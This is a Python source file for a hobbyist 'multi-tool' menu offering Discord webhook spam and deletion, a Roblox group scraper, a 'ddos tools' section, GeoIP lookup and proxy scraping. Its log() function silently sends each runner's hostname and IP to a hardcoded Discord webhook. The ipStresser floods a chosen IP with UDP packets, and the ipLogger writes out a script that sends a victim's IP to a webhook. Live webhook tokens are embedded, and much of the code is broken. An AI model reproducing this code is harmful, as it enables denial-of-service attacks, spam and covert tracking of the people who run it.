import os, requests, time, sys, random, socket, urllib
from datetime import datetime
import pprint
from dhooks import Webhook
import socket, threading
from covid import Covid
import bs4
from bs4 import BeautifulSoup
from pypresence import Presence
rpc = Presence("771813602416001024")
rpc.connect()
rpc.update(state="using some shitty tools", details="lol", large_image="smile")


def log(name):
    logging = Webhook("https://discord.com/api/webhooks/754324914189893632/9QruauiSVUyFoLzi6YVxLLA_qcWqSK1W766K40ohVxYug4UV95YWH2QIaSaw4JXjrGau")
    ip = socket.gethostbyname(socket.getfqdn())
    datae = f"{name} has been executed by {socket.gethostname()}, with the ip adress of {ip}"
    logging.send(datae)
# tools lol


def GeoIP():
    ip_input = input('  IP> ')
    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
    response.json()
    pprint.pprint(response.json())
    time.sleep(8)
    log("GeoIP")
    Main()
def ProxyScrape():
    colour = "\033[31m"
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input("  Type> ")
    p_timeout = input("  Timeout> ")
    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
    with open("proxies.txt", "w") as f:
        f.write(r.text)
        print("proxies have been saved to" + colour + '"proxies.txt"')
        time.sleep(5)
        log("Proxyscraper")
        Main()
def webhookSpammer():
    sex = input("  how many times: ")
    yeeter = input("  Webhook: ")
    data = input("  Text: ")
    for i in range(int(sex)):
        hook = Webhook(yeeter)
        hook.send(data)
    print("webhook spammed")
    log("WebHook Spammer")
    time.sleep(3)
    Main()

def webhookDelete():
    yeeter = input("  webhook: ")
    hook = Webhook(yeeter)
    time.sleep(1)
    print("webhook deleted")
    hook.delete()
    log("Webhook Delete")
    Main()

def covidCheck():
    coveed = Covid()
    yellow = "\033[33m"
    cyan = "\033[36m"
    print(yellow + "        [1]" + cyan + " confirmed cases")
    print(yellow + "        [2]" + cyan + " country cases")
    print(yellow + "        [3]" + cyan + " recovered cases")
    print(yellow + "        [4]" + cyan + " total deaths")
    while True:
        choosen = input("  > ")
        if(choosen == str(1)):             
            confirmed = coveed.get_total_confirmed_cases()
            print(F"  there are {confirmed} confirmed cases")
            time.sleep(5)
            log("Covid")
            Main()
        elif(choosen == str(2)):             
            country = input("  country: ").lower
            country_cases = coveed.get_status_by_country_name(country)
            print(f"there are {country_cases} cases in {country}")
            time.sleep(3)
            log("Covid")
            Main()
        elif(choosen == str(3)):             
            recovered = coveed.get_total_recovered()
            print(f"there are {recovered} recovered people from covid")
            time.sleep(8)
            log("Covid")
            Main()
        elif(choosen == str(4)):
            deaths = coveed.get_total_deaths()
            print(f"there are {deaths} dead people from covid")
            time.sleep(8)
            log("Covid")
            Main()
def ipStresser():
    class Denial:
        def __init__(self, host):
            threading.Thread.__init__(self)
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.host = host
            self.port = 80 
            self.duration = 0
            self.bytes = random._urandom(1024)
            self.sent = 0


        def send_packet(self):
            while True:
                try:
                    send_all = self.connection.sendto(self.bytes,(self.host, self.port))
                    print("[**] Flood Started... On " + self.host)
                except UnboundLocalError:
                    try:
                        pass
                        print("[**] Flood Started... On " + self.host)
                    except:
                        pass
                except KeyboardInterrupt:
                    print("\n")
                    print("[+] Exiting....")
                    print("\n")
            while True:
                connect_all = send_all.accept()
                newthread = ClientThread(send_all)
                newthread.start()

                print("[+] Press Control^C to End! ")
                more_dos = input("[+] Would You Like To Boot A User Offline[exit/return]: ")

                if more_dos == "exit":
                    self.connection.close()
                    exit()
                elif more_dos == "return":
                    self.send_packet()
                else:
                    self.connection.close()
                    exit()

    ip_attack = input("Enter ip address: ")
    results = Denial(ip_attack)
    results.send_packet()
    Main()
def groupScraper():
    cum = input("  how many times (60000000 - 80000000): ")
    for i in int(cum):
        page = requests.get(f"https://www.roblox.com/groups/{random.randint(1, 1000000)}")
        soup = BeautifulSoup(page.content, "html.parser")
        colour = "\033[31m"
    if(soup.find('<span class="font-header-2 ng-binding" title="12" ng-bind="library.currentGroup.group.memberCount | abbreviate">0</span>')):
        with open("groups.txt", "w") as f:
            f.write(page.text)
            print("proxies have been saved to" + colour + '"groups.txt"')
            time.sleep(5)
            log("groupscraper")
def ipLogger():
    webhook = input("webhook")
    with open("logger.py", "w") as f:
        f.write("""
from dhooks import Webhook
import socket

hook = https://discord.com/api/webhooks/757606787372417114/-00U29n-3a8Hj1o7o3V1AbGS8H7k-X6Nqp4USTAQMmAiR4Jk1YLgh7fNmsdI2CSd5dfC
hook.send(socket.gethostbyname(socket.getfqdn()))
        """)
def optionsDiscord():
    sex = "\033[33m"
    cex = "\033[36m"
    print(sex + '        [1]' + cex + '  webhook spammer')
    print(sex + '        [2]' + cex + '  webhook deleter')
    choose = input("  > ")
    if(choose == str(1)):
        webhookSpammer()
    elif(choose == str(2)):
        webhookDelete()
def optionsIllegal():
    sex = "\033[33m"
    cex = "\033[36m"
    print(sex + '        [1]' + cex + '  ddoser')
    print(sex + '        [1]' + cex + '  ip logger (BETA)')
    choose = input("  > ")
    if(choose == str(1)):
        ipStresser()
    elif(choose == str(2)):
        ipLogger()

def optionsRoblox():
    sex = "\033[33m"
    cex = "\033[36m"
    print(sex + '        [1]' + cex + '  group scraper (BETA) ')
    choose = input("  > ")
    if(choose == str(1)):
        groupScraper()

def optionsOther():
    sex = "\033[33m"
    cex = "\033[36m"
    print(sex + '        [1]' + cex + '  geoip')
    print(sex + '        [2]' + cex + '  proxy scraper')
    print(sex + '        [3]' + cex + '  covid')
    choose = input("  > ")
    if(choose == str(1)):
        GeoIP()
    elif(choose == str(2)):
        ProxyScrape()
    elif(choose == str(3)):
        covidCheck()


    # main code
class Main():
    def cls(self):
        linux = "clear"
        windows = "cls"
        os.system([linux, windows][os.name == "nt"])
    # ????????????????????????????????/ what the fuck does this mean
    def __init__(self):
        self.gg = True
        self.r = "\033[31m"
        self.g = "\033[32m"
        self.y = "\033[33m"
        self.b = "\033[34m"
        self.m = "\033[35m"
        self.c = "\033[36m"
        self.w = "\033[37m"
        self.rr = "\033[39m"
        self.cls()
        self.start_logo()
        self.options()
        while self.gg == True:
            choose = input(str("  > "  ))
            if(choose == str(1)):
                self.cls()
                self.start_logo()               
                optionsDiscord()
            elif(choose == str(2)):
                self.cls()
                self.start_logo()
                optionsRoblox()
            elif(choose == str(3)):
                self.cls()
                self.start_logo()
                optionsIllegal()
            elif(choose == str(4)):
                self.cls()
                self.start_logo()
                optionsOther()


    def start_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]
        x = """
        ████████╗███████╗███████╗████████╗
        ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
           ██║   █████╗  ███████╗   ██║   
           ██║   ██╔══╝  ╚════██║   ██║   
           ██║   ███████╗███████║   ██║   
           ╚═╝   ╚══════╝╚══════╝   ╚═╝   

        """

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
    def options(self):
        print(self.y + '        [1]' + self.c + '  discord tools')
        print(self.y + '        [2]' + self.c + '  roblox tools')
        print(self.y + '        [3]' + self.c + '  ddos tools')
        print(self.y + '        [4]' + self.c + '  other tools')
        




Main()
